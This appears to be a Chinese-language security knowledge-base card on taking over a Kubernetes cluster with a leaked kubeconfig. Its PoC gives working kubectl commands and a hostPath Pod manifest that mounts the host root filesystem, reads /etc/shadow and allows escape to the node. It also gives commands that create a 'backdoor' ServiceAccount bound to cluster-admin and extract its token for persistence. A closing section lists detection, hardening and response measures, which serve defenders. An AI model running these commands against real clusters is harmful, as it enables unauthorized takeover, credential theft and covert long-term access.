---
id: cloud-k8s-kubeconfig-leak-cluster-takeover
title: Kubeconfig 泄露接管 K8s 集群并创建持久化后门
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-kubeconfig-leak-takeover
aliases:
- kubeconfig 泄露
- K8s Config 文件泄露
- kubectl --kubeconfig
- 集群凭据泄露
- K8s 后门 ServiceAccount
tags:
- k8s
- kubernetes
- kubeconfig
- credential-leak
- rbac
- persistence
- container-escape
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:36+08:00'
  notes: 已对照原文与图片56核对：kubeconfig含certificate-authority-data/client-certificate-data/client-key-data及server地址，kubectl --kubeconfig可接管；卡内主机/容器/CI泄露途径、hostPath逃逸与SA后门步骤与原文一致。注意原文SA secret取Token方式在K8s1.24+默认不再自动创建，需kubectl create token，卡内加固段已提到短期Token但PoC未标注该版本差异，作为未验证点保留。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

Kubeconfig（通常 `~/.kube/config`）包含 API Server 地址、CA 证书以及客户端证书/Token；一旦从开发者机器、容器挂载、代码仓库、日志或 CI 工具中泄露，攻击者可直接 `kubectl --kubeconfig` 操作集群，创建挂载宿主机根目录的 Pod 逃逸，并创建绑定 `cluster-admin` 的 ServiceAccount 作为持久化后门。

## 原理

- Kubeconfig 是 kubectl 的认证配置，包含 `clusters`（server、certificate-authority-data）、`users`（client-certificate-data/client-key-data 或 token）、`contexts`（cluster+user+namespace）。
- 它等价于集群账号凭证；泄露后无需再攻击 API Server 认证，直接以该账号权限操作。
- 常见泄露途径：开发者本地机器被入侵、误提交到 Git/GitLab、备份/压缩包公开、容器挂载 `/root/.kube` 或 `/home/*/.kube`、应用日志打印配置、CI/CD 变量或构建产物。
- 利用方式：`kubectl --kubeconfig=stolen get nodes` 验证；创建 `hostPath: /` 的 Pod 逃逸；创建 ServiceAccount + ClusterRoleBinding 绑定 `cluster-admin`，再取 Token 作为长期后门。
- 权限取决于 kubeconfig 对应用户/SA；若是 `cluster-admin`，可直接接管整个集群。

## 触发条件

- 获取到有效 kubeconfig 文件（或其中的 client cert/token）。
- 文件未过期、未被吊销，API Server 可达。
- 对应账号有创建 Pod/读取 Secret/绑定 RBAC 等权限；至少需要能创建 Pod 才能走 hostPath 逃逸。
- 集群准入控制未阻止 hostPath/privileged Pod。

## 利用步骤

1. 保存泄露的 kubeconfig 为 `stolen-kubeconfig`，`chmod 600`。
2. 验证：`kubectl --kubeconfig=stolen-kubeconfig get nodes`；若证书过期/被吊销则失败。
3. 探测权限：`get namespaces`、`-n kube-system get pods`、`get clusterroles`、`auth can-i --list`。
4. 创建恶意 Pod（hostPath `/`），进入后写宿主机 crontab 或 `chroot` 逃逸。
5. 持久化：创建 ServiceAccount `backdoor`，绑定 `cluster-admin`，读取其 Token 保存；后续用 `kubectl --token` 访问，不依赖原 kubeconfig。
6. 清理：删除测试 Pod；如授权测试，移除后门 SA/绑定并报告。
7. 记录 kubeconfig 来源、权限范围、集群影响。

## PoC

```bash
# 1) 验证
kubectl --kubeconfig=stolen-kubeconfig get nodes

# 2) 权限探测
kubectl --kubeconfig=stolen-kubeconfig auth can-i --list
kubectl --kubeconfig=stolen-kubeconfig -n kube-system get pods

# 3) 创建 hostPath Pod
kubectl --kubeconfig=stolen-kubeconfig apply -f hostpath-pod.yaml -n default
kubectl --kubeconfig=stolen-kubeconfig exec -it hostpath-pod -n default -- bash
# 容器内：cd /host && cat etc/shadow

# 4) 持久化后门
kubectl --kubeconfig=stolen-kubeconfig create serviceaccount backdoor -n kube-system
kubectl --kubeconfig=stolen-kubeconfig create clusterrolebinding backdoor-cluster-admin \
  --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor
kubectl --kubeconfig=stolen-kubeconfig -n kube-system get secret \
  $(kubectl --kubeconfig=stolen-kubeconfig -n kube-system get sa/backdoor -o jsonpath='{.secrets[0].name}') \
  -o jsonpath='{.data.token}' | base64 -d
```

hostPath Pod：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  containers:
  - name: c
    image: nginx
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
```

## 变体与关联

- 变体：只泄露 client-certificate/key 时，可手工构造 kubeconfig；只泄露 Token 时可用 `--token`。
- 变体：kubeconfig 指向的账号只有只读权限时，先读 Secret/环境变量找更高权限 Token。
- 变体：EKS/GKE/AKS 的 exec 插件 kubeconfig 可能依赖云 CLI 临时凭证，需同时获取云凭证。
- 关联：[[cloud-k8s-k8s-rbac-clusterrolebinding-privesc]]（RBAC 绑定 cluster-admin）。
- 关联：[[cloud-k8s-k8s-rbac-secret-read]]（Secret 读取横向）。
- 关联：[[cloud-container-k8s-workload-config-escape]]（hostPath/privileged 逃逸）。
- 注意：后门 SA 会留下明显审计痕迹；授权测试后必须清理。

## 检测与防御

- 防御：kubeconfig `chmod 600`，禁止提交到代码仓库（`.gitignore` 排除 `.kube/`）；使用短期 Token/`kubectl create token` 替代长期证书。
- 防御：不同人员/CI 使用最小权限 ServiceAccount，避免全员 `cluster-admin`；启用 API Server 审计日志与异常来源告警。
- 防御：准入控制禁止 hostPath `/`、privileged Pod；限制 `create clusterrolebindings`/`create serviceaccounts` 权限。
- 检测：代码仓库/日志中出现 `certificate-authority-data`、`client-key-data`、`kubeconfig`；异常 IP 使用 kubeconfig 访问 API；创建 hostPath Pod；新建绑定 cluster-admin 的 SA；`system:serviceaccount:kube-system:backdoor` 类账号。
- 响应：吊销泄露证书/Token、删除后门 SA/绑定、检查节点 crontab/SSH、轮换集群凭据、审计 API 日志。
